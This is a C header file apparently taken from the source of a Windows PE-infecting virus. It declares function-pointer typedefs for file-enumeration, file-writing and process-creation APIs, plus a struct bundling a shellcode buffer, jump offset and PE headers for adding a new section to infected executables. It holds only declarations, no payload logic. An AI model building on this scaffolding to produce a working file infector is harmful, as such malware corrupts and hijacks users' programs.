#ifndef _PE_VIRUS_TYPEDEF_H_
#define _PE_VIRUS_TYPEDEF_H_
#include <Windows.h>
#include <winternl.h>
typedef HANDLE (WINAPI *__FindFirstFileA) (
    _In_ LPCSTR lpFileName,
    _Out_ LPWIN32_FIND_DATAA lpFindFileData
);
typedef BOOL (WINAPI *__FindNextFileA) (
    _In_ HANDLE hFindFile,
    _Out_ LPWIN32_FIND_DATAA lpFindFileData
);
typedef BOOL (WINAPI *__FindClose) (
    _Inout_ HANDLE hFindFile
);
typedef HANDLE (WINAPI *__CreateFileA) (
    _In_ LPCSTR lpFileName,
    _In_ DWORD dwDesiredAccess,
    _In_ DWORD dwShareMode,
    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    _In_ DWORD dwCreationDisposition,
    _In_ DWORD dwFlagsAndAttributes,
    _In_opt_ HANDLE hTemplateFile
);
typedef BOOL (WINAPI *__WriteFile) (
    _In_ HANDLE hFile,
    _In_reads_bytes_opt_(nNumberOfBytesToWrite) LPCVOID lpBuffer,
    _In_ DWORD nNumberOfBytesToWrite,
    _Out_opt_ LPDWORD lpNumberOfBytesWritten,
    _Inout_opt_ LPOVERLAPPED lpOverlapped
);
typedef BOOL (WINAPI *__ReadFile) (
    _In_ HANDLE hFile,
    _Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesRead) __out_data_source(FILE) LPVOID lpBuffer,
    _In_ DWORD nNumberOfBytesToRead,
    _Out_opt_ LPDWORD lpNumberOfBytesRead,
    _Inout_opt_ LPOVERLAPPED lpOverlapped
);
typedef DWORD (WINAPI *__SetFilePointer) (
    _In_ HANDLE hFile,
    _In_ LONG lDistanceToMove,
    _Inout_opt_ PLONG lpDistanceToMoveHigh,
    _In_ DWORD dwMoveMethod
);
typedef BOOL (WINAPI *__SetEndOfFile) (
    _In_ HANDLE hFile
);
typedef DWORD (WINAPI *__GetFileSize) (
    _In_ HANDLE hFile,
    _Out_opt_ LPDWORD lpFileSizeHigh
);
// handleapi.h
typedef BOOL (WINAPI *__CloseHandle) (
    _In_ _Post_ptr_invalid_ HANDLE hObject
);
// processthreadsapi.h
typedef BOOL (WINAPI *__CreateProcessA) (
    _In_opt_ LPCSTR lpApplicationName,
    _Inout_opt_ LPSTR lpCommandLine,
    _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
    _In_ BOOL bInheritHandles,
    _In_ DWORD dwCreationFlags,
    _In_opt_ LPVOID lpEnvironment,
    _In_opt_ LPCSTR lpCurrentDirectory,
    _In_ LPSTARTUPINFOA lpStartupInfo,
    _Out_ LPPROCESS_INFORMATION lpProcessInformation
);

typedef struct SHELL_CODE_SUPER_BLOCK {
    // code info
    PBYTE _shellCode;
    DWORD _JMP_POINT_OFFSET;
    DWORD _CODE_SIZE;
    // function
    __FindFirstFileA _FindFirstFileA;
    __FindNextFileA _FindNextFileA;
    __FindClose _FindClose;
    __CreateFileA _CreateFileA;
    __WriteFile _WriteFile;
    __ReadFile _ReadFile;
    __SetFilePointer _SetFilePointer;
    __SetEndOfFile _SetEndOfFile;
    __GetFileSize _GetFileSize;
    __CloseHandle _CloseHandle;
    __CreateProcessA _CreateProcessA;
    // headers
    IMAGE_DOS_HEADER dosHdr;
    IMAGE_FILE_HEADER fileHdr;
    IMAGE_OPTIONAL_HEADER32 optHdr;
    IMAGE_SECTION_HEADER lasSecHdr, newSecHdr;
} SCSB, *PSCSB;

// Structs representing export table, export address table and ordinal table
typedef struct _IMAGE_EXPORT_ADDRESS_TABLE_ {
    union {
        DWORD dwExportRVA;
        DWORD dwForwarderRVA;
    };
} IMAGE_EXPORT_ADDRESS_TABLE, *PIMAGE_EXPORT_ADDRESS_TABLE;

typedef PCHAR IMAGE_EXPORT_NAME_POINTER ;
typedef PCHAR *PIMAGE_EXPORT_NAME_POINTER;

typedef WORD IMAGE_EXPORT_ORDINAL_TABLE;
typedef WORD *PIMAGE_EXPORT_ORDINAL_TABLE;

#endif // _PE_VIRUS_TYPEDEF_H_
